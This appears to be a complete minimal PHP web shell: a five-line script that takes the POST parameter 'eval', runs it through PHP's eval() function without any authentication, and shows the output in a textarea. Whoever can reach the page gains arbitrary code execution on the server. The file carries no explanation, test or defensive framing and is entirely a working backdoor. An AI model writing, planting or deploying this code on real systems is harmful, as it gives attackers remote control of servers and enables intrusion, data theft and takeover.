<?php
$eval = $_POST['eval'];
echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
eval($eval);
?>